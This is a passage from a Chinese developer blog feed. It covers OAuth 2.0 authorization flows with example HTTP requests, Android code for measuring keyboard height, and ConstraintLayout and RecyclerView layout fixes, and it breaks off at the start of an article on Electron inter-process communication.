src="https://upload-images.jianshu.io/upload_images/15531792-ff367efec38b72a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ol><p>该流中也有一个变化，称为隐式流。<br>Request:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET https:&#x2F;&#x2F;accounts.google.com&#x2F;o&#x2F;oauth2&#x2F;auth?scope&#x3D;gmail.insert gmail.send</span><br><span class="line">&amp;redirect_uri&#x3D;https:&#x2F;&#x2F;app.example.com&#x2F;oauth2&#x2F;callback</span><br><span class="line">&amp;response_type&#x3D;code&amp;client_id&#x3D;812741506391</span><br><span class="line">&amp;state&#x3D;af0ifjsldkj</span><br></pre></td></tr></table></figure><p>  这是一个带有大量查询参数的GET请求（出于示例目的，未经URL编码）。 scope来自Gmail的API。 redirect_uri是授权授权应返回到的客户端应用程序的URL。 这应该与客户端注册过程中的值（在DMV上）匹配。  response_type会改变OAuth流。clieny ID是注册获取的。 state是一个安全标志，类似于XRSF。</p><p>Response</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Found</span><br><span class="line">Location: https:&#x2F;&#x2F;app.example.com&#x2F;oauth2&#x2F;callback?</span><br><span class="line">code&#x3D;MsCeLvIaQm6bTrgtp7&amp;state&#x3D;af0ifjsldkj</span><br></pre></td></tr></table></figure><p>返回的code是authorization grant，state是为了确保它不是伪造的，并且来自同一请求。完成前通道后，后通道流就会开始，将交换授权码来获取访问令牌。</p><p>客户端应用程序使用机密的客户端credentials和 client ID将访问令牌请求发送到授权服务器上的令牌端点（token endpoint）。 此过程发送授权代码以获取访问令牌和（可选）刷新令牌。 客户端使用访问令牌访问受保护的资源。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-5dda2863672ed77a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>以下是HTTP<br>Request<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;oauth2&#x2F;v3&#x2F;token HTTP&#x2F;1.1</span><br><span class="line">Host: www.googleapis.com</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">code&#x3D;MsCeLvIaQm6bTrgtp7&amp;client_id&#x3D;812741506391&amp;client_secret&#x3D;&#123;client_secret&#125;&amp;redirect_uri&#x3D;https:&#x2F;&#x2F;app.example.com&#x2F;oauth2&#x2F;callback&amp;grant_type&#x3D;authorization_code</span><br></pre></td></tr></table></figure><br>  grant_type是OAuth的可扩展部分,这是授权代码。 它很灵活，使他们可以采用不同的方式来描述这些grant。 这是OAuth流的最常见类型。</p><p>Reponse</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;access_token&quot;: &quot;2YotnFZFEjr1zCsicMWpAA&quot;,</span><br><span class="line">  &quot;token_type&quot;: &quot;Bearer&quot;,</span><br><span class="line">  &quot;expires_in&quot;: 3600,</span><br><span class="line">  &quot;refresh_token&quot;: &quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  Reponse为JSON。两种方式使用令牌： 1.在客户端中设置一个计时器。2.捕获错误并尝试获取新令牌。<br>获得访问令牌后，可以在Authentication Header中使用访问令牌（使用token_type作为前缀）来发出受保护的资源请求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;Authorization: Bearer 2YotnFZFEjr1zCsicMWpAA&quot; \</span><br><span class="line">  https:&#x2F;&#x2F;www.googleapis.com&#x2F;gmail&#x2F;v1&#x2F;users&#x2F;1444587525&#x2F;messages</span><br></pre></td></tr></table></figure><p>前通道，后通道，不同的端点和不同的客户端。 我们必须针对不同的场景将它们混合使用和匹配。 这样会提高Oauth的复杂度</p><h4 id="OAuth-flow"><a href="#OAuth-flow" class="headerlink" title="OAuth flow"></a>OAuth flow</h4><ol><li><p>第一种flow就是所谓的隐式flow。之所以称为隐式flow（Implicit Flow.），是因为所有通信都是通过浏览器进行的。没有后端服务器为访问令牌兑换授权。 SPA是该流程用例的一个很好的例子。此flow也称为2 Legged OAuth。<br>隐式flow仅仅针对浏览器的公共客户端进行了优化。访问令牌直接从授权请求中返回（仅前通道），它通常不支持刷新令牌。假定资源所有者和公共客户端在同一设备上。由于一切都发生在浏览器上，因此它最容易受到安全威胁的攻击。</p></li><li><p>黄金标准是使用前通道和后通道的授权码流(Authorization Code Flow)，也称为3 Legged。这就是我们在本文中讨论最多的内容。客户端应用程序使用前通道流来获取授权码授予。客户端应用程序使用后向通道将授权代码授权交换为访问令牌（以及可选的刷新令牌）。假定资源所有者和客户端应用程序位于单独的设备上。这是最安全的流程，因为您可以对客户端进行身份验证以兑换授权，并且令牌永远不会通过用户代理传递。不仅有隐式和授权码流，您还可以使用OAuth进行其他处理。同样，OAuth更像是一个框架。</p></li></ol><ol start="3"><li><p>对于服务器到服务器的方案，您可能要使用客户端凭据流(Client Credential Flow)。在这种情况下，客户端应用程序是一个机密的客户端，它以自己身份访问而不是代表用户。这更多是服务帐户类型的情况。您只需要客户的凭据即可完成整个流程。这是只需要back channel的flow， 通过client 凭据就能获取访问令牌。它支持共享密钥或断言作为使用对称或非对称密钥签名的客户端凭据。<br>对称密钥算法是加密算法，只要有密码，就可以解密任何内容。在保护PDF或.zip文件时通常会发现这种情况。<br>公钥密码学或非对称密码学是使用密钥对的密码系统：公钥和私钥。任何人都可以读取公共密钥，并用公钥加密，所有者可以使用私有密钥解密。这样既保证了数据安全也无需共享秘钥。</p></li><li><p>还有一种称为资源所有者密码流（Resource Owner Password Flow）的旧模式。这与使用用户名和密码的直接身份验证非常相似，因此不建议使用。这是本机用户名/密码应用程序（例如桌面应用程序）的旧式授权类型。在此流程中，您向客户端应用程序发送用户名和密码，并从授权服务器返回访问令牌。它通常不支持刷新令牌，并且假定资源所有者和公共客户端在同一设备上。当API 只支持OAuth，但又有老派客户需要处理时可以使用。</p></li><li><p>OAuth的最新流是断言流（Assertion Flow），它类似于客户端凭据流（Client Credential Flow）。添加它是为了打开联盟的想法。此流程允许授权服务器信任来自第三方（例如SAML IdP）的授权。授权服务器信任身份提供者。该断言用于从令牌端点获取访问令牌。这对于投资于SAML或SAML相关技术并允许其与OAuth集成的公司来说非常有用。由于SAML断言是短暂的，因此此流程中没有刷新令牌，并且每次断言到期时都必须继续检索访问令牌。</p></li><li><p>设备流（ Device Flow）不是OAuth规范中的内容。没有网络浏览器，只有电视之类的控制器。用户代码从授权请求中返回，必须通过使用浏览器访问设备上的URL进行授权才能兑现。客户端应用程序使用反向通道流来轮询访问令牌和可选的刷新令牌的授权批准。也受CLI客户端欢迎。</p></li></ol><p>我们使用了不同的参与者和令牌类型，涵盖了六种不同的流程。由于客户的能力，我们需要如何获得客户的同意，进行同意的方式，所以它们是必需的，这给OAuth增加了很多复杂性。<br>当人们问您是否支持OAuth时，您必须明确他们的要求。他们是在问您是否支持所有六个流程，还是仅支持主要流程？所有不同的流程之间都有很多可用的粒度。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 如何获取keyboard的高度</title>
      <link href="/2020/10/03/Android-%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96keyboard%E7%9A%84%E9%AB%98%E5%BA%A6/"/>
      <url>/2020/10/03/Android-%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96keyboard%E7%9A%84%E9%AB%98%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<p>Android程序中，键盘弹出或者关闭，有的时候我们需要做一些操作，那么我们怎么才能获取键盘高度呢？目前没找到直接获取的方法，可以采取动态计算的形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; 在一个class里面定义以下变量：</span><br><span class="line">private Point previousWindowVisibleSize;</span><br><span class="line">private Point previousViewVisibleSize;</span><br><span class="line">private isPhone; &#x2F;&#x2F; 是手机还是平板，一般用设备的size来计算，比如最短边小于600dp是手机，大于600dp是平板</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; addOnGlobalLayoutListener</span><br><span class="line">contentView.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public void onGlobalLayout() &#123;</span><br><span class="line">                &#x2F;&#x2F; 分别获取view和view的可见范围</span><br><span class="line">                Rect windowVisibleRect &#x3D; new Rect();</span><br><span class="line">                getWindowVisibleDisplayFrame(windowVisibleRect);</span><br><span class="line">                Rect viewVisibleRect &#x3D; new Rect();</span><br><span class="line">                getGlobalVisibleRect(viewVisibleRect);</span><br><span class="line">                &#x2F;&#x2F; 第一次render，记录初始值</span><br><span class="line">                if(previousWindowVisibleSize &#x3D;&#x3D; null || previousViewVisibleSize &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    previousWindowVisibleSize &#x3D; new Point(windowVisibleRect.width(), windowVisibleRect.height());</span><br><span class="line">                    previousViewVisibleSize &#x3D; new Point(viewVisibleRect.width(), viewVisibleRect.height());</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F; 如果view和window的可见size都没有变化，那么键盘也没有显示或者隐藏</span><br><span class="line">                if (previousWindowVisibleSize.x &#x3D;&#x3D; windowVisibleRect.width() &amp;&amp; </span><br><span class="line">                    previousWindowVisibleSize.y &#x3D;&#x3D; windowVisibleRect.height() &amp;&amp;</span><br><span class="line">                    previousViewVisibleSize.x &#x3D;&#x3D; viewVisibleRect.width() &amp;&amp; </span><br><span class="line">                    previousViewVisibleSize.y &#x3D;&#x3D; viewVisibleRect.height())&#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                &#x2F;&#x2F; 如果有变化， 那么可能是旋转或者键盘显示隐藏</span><br><span class="line"></span><br><span class="line">                &#x2F;&#x2F; 键盘显示或者隐藏</span><br><span class="line">                if (previousWindowVisibleSize.x &#x3D;&#x3D; windowVisibleRect.width() ) &#123;</span><br><span class="line">                    calculateKeyboardHeight();</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                  &#x2F;&#x2F; 旋转，一般来说旋转会调用 onGlobalLayout()两次，宽度变化和高度变化，但也有只调用一次的情况即高度变化</span><br><span class="line">                  &#x2F;&#x2F;其他操作</span><br><span class="line">                &#125;</span><br><span class="line">                calculateKeyboardHeight();</span><br><span class="line">                previousWindowVisibleSize.x &#x3D; windowVisibleRect.width();</span><br><span class="line">                previousWindowVisibleSize.y &#x3D; windowVisibleRect.height();</span><br><span class="line">                previousViewVisibleSize.x &#x3D; viewVisibleRect.width();</span><br><span class="line">                previousViewVisibleSize.y &#x3D; viewVisibleRect.height();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private int calculateKeyboardHeight() &#123;</span><br><span class="line"></span><br><span class="line">        DisplayMetrics metrics &#x3D; Resources.getSystem().getDisplayMetrics();</span><br><span class="line">        int screenHeight &#x3D; metrics.heightPixels;</span><br><span class="line">        boolean isPortrait &#x3D; screenHeight &gt; metrics.widthPixels;</span><br><span class="line"></span><br><span class="line">        Rect windowVisibleRect &#x3D; new Rect();</span><br><span class="line">        getWindowVisibleDisplayFrame(windowVisibleRect);</span><br><span class="line"></span><br><span class="line">        Rect viewVisibleRect &#x3D; new Rect();</span><br><span class="line">        getGlobalVisibleRect(viewVisibleRect);</span><br><span class="line">        int offset &#x3D; windowVisibleRect.top - viewVisibleRect.top;</span><br><span class="line">        &#x2F;&#x2F; window和view的起始位置不同，把他们弄到相同的起始位置</span><br><span class="line">        viewVisibleRect.offset(0, offset);</span><br><span class="line"></span><br><span class="line">        boolean isKeyboardShowing &#x3D; false;</span><br><span class="line">        int coverHeight;  &#x2F;&#x2F;view被挡住的部分</span><br><span class="line">        int keyboardHeight; </span><br><span class="line"></span><br><span class="line">        if (isPhone) &#123;</span><br><span class="line">                &#x2F;&#x2F; 对于手机来说，view被resize了，他们没有被键盘挡住</span><br><span class="line">                keyboardHeight &#x3D; screenHeight - viewVisibleRect.bottom</span><br><span class="line">                isKeyboardShowing &#x3D; keyboardHeight &gt; 0;</span><br><span class="line">                coverHeight &#x3D; screenHeight - windowVisibleRect.bottom;     </span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            &#x2F;&#x2F; 对于平板来说，window虽然被resize， 但是还是有部分view被keyboard挡住</span><br><span class="line">            keyboardHeight &#x3D; coverHeight &#x3D; screenHeight - windowVisibleRect.bottom;</span><br><span class="line">            isKeyboardShowing &#x3D; keyboardHeight &gt; 0;</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        return keyboardHeight;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ConstraintLayout 设置layoutParams在scrollview中不起作用， recyclerView在scrollview中bind所有items</title>
      <link href="/2020/10/03/ConstraintLayout-%E8%AE%BE%E7%BD%AElayoutParams%E5%9C%A8scrollview%E4%B8%AD%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8%EF%BC%8C-recyclerView%E5%9C%A8scrollview%E4%B8%ADbind%E6%89%80%E6%9C%89items/"/>
      <url>/2020/10/03/ConstraintLayout-%E8%AE%BE%E7%BD%AElayoutParams%E5%9C%A8scrollview%E4%B8%AD%E4%B8%8D%E8%B5%B7%E4%BD%9C%E7%94%A8%EF%BC%8C-recyclerView%E5%9C%A8scrollview%E4%B8%ADbind%E6%89%80%E6%9C%89items/</url>
      
        <content type="html"><![CDATA[<h1 id="ConstraintLayout-设置layoutParams在scrollview中不起作用"><a href="#ConstraintLayout-设置layoutParams在scrollview中不起作用" class="headerlink" title="ConstraintLayout 设置layoutParams在scrollview中不起作用"></a>ConstraintLayout 设置layoutParams在scrollview中不起作用</h1><p>运行ConstraintLayout, 并将其放到ScrollView里面，但是设置layout_height 不起作用，ConstraintLayout的height总是和ScrollView一样，在xml和在代码里面设置均不起作用，stack overflow上也有人遇到一样的问题 <a href="https://stackoverflow.com/questions/61176704/android-constraint-layout-height-inside-scrollview-have-no-effect">stackoverflow 链接</a>， 这应该是ConstraintLayout的一个bug， 解决方法就是设置minHeight或者maxHeight让height变成自己想要的高度。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;ScrollView </span><br><span class="line"></span><br><span class="line">    android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line"></span><br><span class="line">    android:layout_height&#x3D;&quot;300dp&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;androidx.constraintlayout.widget.ConstraintLayout </span><br><span class="line"></span><br><span class="line">         android:layout_width&#x3D;&quot;match_parent&quot; </span><br><span class="line"></span><br><span class="line">         android:background&#x3D;&quot;#FFC0CB&quot; </span><br><span class="line"></span><br><span class="line">         android:minHeight&#x3D;&quot;500dp&quot; **</span><br><span class="line"></span><br><span class="line">         android:layout_height&#x3D;&quot;500dp&quot; &gt; </span><br><span class="line"></span><br><span class="line">         &lt;TextView android:id&#x3D;&quot;@+id&#x2F;new_realm_message&quot; </span><br><span class="line"></span><br><span class="line">             android:layout_width&#x3D;&quot;wrap_content&quot; </span><br><span class="line"></span><br><span class="line">             android:layout_height&#x3D;&quot;wrap_content&quot; </span><br><span class="line"></span><br><span class="line">             android:layout_marginTop&#x3D;&quot;301dp&quot; </span><br><span class="line"></span><br><span class="line">             android:text&#x3D;&quot;long text&quot; </span><br><span class="line"></span><br><span class="line">             app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot; </span><br><span class="line"></span><br><span class="line">             app:layout_constraintLeft_toLeftOf&#x3D;&quot;parent&quot; </span><br><span class="line"></span><br><span class="line">             app:layout_constraintRight_toRightOf&#x3D;&quot;parent&quot; </span><br><span class="line"></span><br><span class="line">             app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;ScrollView&gt;</span><br></pre></td></tr></table></figure><h1 id="recyclerView在scrollview中bind所有items"><a href="#recyclerView在scrollview中bind所有items" class="headerlink" title="recyclerView在scrollview中bind所有items"></a>recyclerView在scrollview中bind所有items</h1><p>比如以下layout布局：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;androidx.core.widget.NestedScrollView xmlns:android&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res&#x2F;android&quot;</span><br><span class="line">    xmlns:app&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res-auto&quot;</span><br><span class="line">    xmlns:tools&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;tools&quot;</span><br><span class="line">    android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">    android:layout_height&#x3D;&quot;match_parent&quot;</span><br><span class="line">    app:layout_behavior&#x3D;&quot;@string&#x2F;appbar_scrolling_view_behavior&quot;</span><br><span class="line">    tools:context&#x3D;&quot;.MainActivity&quot;</span><br><span class="line">    tools:showIn&#x3D;&quot;@layout&#x2F;activity_main&quot;&gt;</span><br><span class="line">    &lt;androidx.constraintlayout.widget.ConstraintLayout</span><br><span class="line">        android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;1000dp&quot;</span><br><span class="line">        android:minHeight&#x3D;&quot;1000dp&quot;&gt;</span><br><span class="line">        &lt;TextView</span><br><span class="line">            android:id&#x3D;&quot;@+id&#x2F;text&quot;</span><br><span class="line">            android:layout_width&#x3D;&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height&#x3D;&quot;wrap_content&quot;</span><br><span class="line">            android:text&#x3D;&quot;Hello World!&quot;</span><br><span class="line">            app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">            app:layout_constraintLeft_toLeftOf&#x3D;&quot;parent&quot;</span><br><span class="line">            app:layout_constraintRight_toRightOf&#x3D;&quot;parent&quot;</span><br><span class="line">            app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot; &#x2F;&gt;</span><br><span class="line">        &lt;androidx.recyclerview.widget.RecyclerView</span><br><span class="line">            android:id&#x3D;&quot;@+id&#x2F;recycler_view&quot;</span><br><span class="line">            app:layout_constraintTop_toBottomOf&#x3D;&quot;@id&#x2F;text&quot;</span><br><span class="line">            app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">            android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">            android:layout_height&#x3D;&quot;0dp&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br><span class="line">&lt;&#x2F;androidx.core.widget.NestedScrollView&gt;</span><br></pre></td></tr></table></figure><p>以上代码中recyclerView的height是0dp， 打印log会发现他在render的时候adapter会调用itemCount次onBindViewHolder(), 如果itemcount特别大，有几千甚至上万个，会发现页面特别卡，没相应。 解决的办法就是设置一个具体的高度在recyclerview上面，像下面这样, 把0dp改成800dp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;androidx.core.widget.NestedScrollView xmlns:android&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res&#x2F;android&quot;</span><br><span class="line">    xmlns:app&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res-auto&quot;</span><br><span class="line">    xmlns:tools&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;tools&quot;</span><br><span class="line">    android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">    android:layout_height&#x3D;&quot;match_parent&quot;</span><br><span class="line">    app:layout_behavior&#x3D;&quot;@string&#x2F;appbar_scrolling_view_behavior&quot;</span><br><span class="line">    tools:context&#x3D;&quot;.MainActivity&quot;</span><br><span class="line">    tools:showIn&#x3D;&quot;@layout&#x2F;activity_main&quot;&gt;</span><br><span class="line">    &lt;androidx.constraintlayout.widget.ConstraintLayout</span><br><span class="line">        android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;1000dp&quot;</span><br><span class="line">        android:minHeight&#x3D;&quot;1000dp&quot;&gt;</span><br><span class="line">        &lt;TextView</span><br><span class="line">            android:id&#x3D;&quot;@+id&#x2F;text&quot;</span><br><span class="line">            android:layout_width&#x3D;&quot;wrap_content&quot;</span><br><span class="line">            android:layout_height&#x3D;&quot;wrap_content&quot;</span><br><span class="line">            android:text&#x3D;&quot;Hello World!&quot;</span><br><span class="line">            app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">            app:layout_constraintLeft_toLeftOf&#x3D;&quot;parent&quot;</span><br><span class="line">            app:layout_constraintRight_toRightOf&#x3D;&quot;parent&quot;</span><br><span class="line">            app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot; &#x2F;&gt;</span><br><span class="line">        &lt;androidx.recyclerview.widget.RecyclerView</span><br><span class="line">            android:id&#x3D;&quot;@+id&#x2F;recycler_view&quot;</span><br><span class="line">            app:layout_constraintTop_toBottomOf&#x3D;&quot;@id&#x2F;text&quot;</span><br><span class="line">            app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">            android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">            android:layout_height&#x3D;&quot;800dp&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br><span class="line">&lt;&#x2F;androidx.core.widget.NestedScrollView&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Electron 进程之间的IPC通信思考</title>
      <link href="/2020/10/02/Electron-%E8%BF%9B%E7%A8%8B%E4%B9%8B%E9%97%B4%E7%9A%84IPC%E9%80%9A%E4%BF%A1%E6%80%9D%E8%80%83/"/>
      <url>/2020/10/02/Electron-%E8%BF%9B%E7%A8%8B%E4%B9%8B%E9%97%B4%E7%9A%84IPC%E9%80%9A%E4%BF%A1%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>转自：<a href="https://juejin.im/post/6844903799530717192">主进程与渲染进程</a></p><p>Electron桌面程序中包含一个main主进程和N个renderer渲染进程</p><p>一、主进程和渲染进程</p><p>1、主进程Main</p><p>回顾以往的web开发，我们的代码，无论是HTML、CSS还是Javascript，都是运行在浏览器的沙盒中的，我们无法越过浏览器的权限访问系统本身的资源，代码的能力被限制在了浏览器中。浏览器之所以这么做，是为了安全的考虑。设想一下，我们在使用浏览器的时候，会打开各式各样不同来源的网站，如果JavaScript代码有能力访问并操作本地操作系统的资源，那将是多么可怕的事情。你在某天不小心打开了一个恶意的网站，可能你存储在硬盘上的文件就被偷走了（都用不着去修电脑）。</p><p>但我们要开发的是桌面应用程序，如果无法访问到本地的资源肯定是不行的。Electron将nodejs巧妙的融合了进来，让nodejs作为整个程序的管家。管家拥有较高的权限，可以访问和操作本地资源，使用原本在浏览器中不提供的高级API。同时管家也管理着渲染进程窗口的创建和销毁。所以，我们将这个管家称之为主进程。在使用Electron开发的程序中，会使用main.js作为程序的主入口，该文件内代码执行的内容，就是主进程中执行的内容。</p><p>2、渲染进程Renderer</p><p>Electron集成了Chromium来展示窗口界面，窗口中所看到的内容使用的都是HTML渲染出来的。 Chromium本身是多进程渲染页面的架构（在默认情况下，Chromium的默认策略是对每一个tab新开一个进程，以确保每个页面是独立且互不影响的。避免一个页面的崩溃导致全部页面无法使用），所以Electron在展示窗口时，也会使用到Chromium的多进程架构。而这种多进程渲染架构在Electron中，就被称之为渲染进程（render process）。</p><p>在Electron中，每创建一个新的窗口，都是一个独立的进程。</p><p>3、主进程于渲染进程的关系</p><p>主进程通过构造BrowserWindow实例来创建页面。每个BrowserWindow实例都在自己的渲染进程里运行页面。当一个BrowserWindow实例被销毁后，相应的渲染进程也会被终止。</p><p>主进程管理所有页面和与之对应的渲染进程。每个渲染进程都是相互隔离的，并且只知道运行在该进程里的页面。</p><p>在页面里调用本地GUI是不允许的，因为在Web页面里管理本地GUI资源是非常危险而且容易造成资源泄露。如果你想在网页里进行GUI操作，该页面的渲染进程必须与主进程进行通讯，请求主进程进行相关的 GUI 操作。</p><p>二、进程之间通信</p><p>主进程和渲染进程之间的通信方法：</p><ol><li>通过IPCRender和IPCMain， 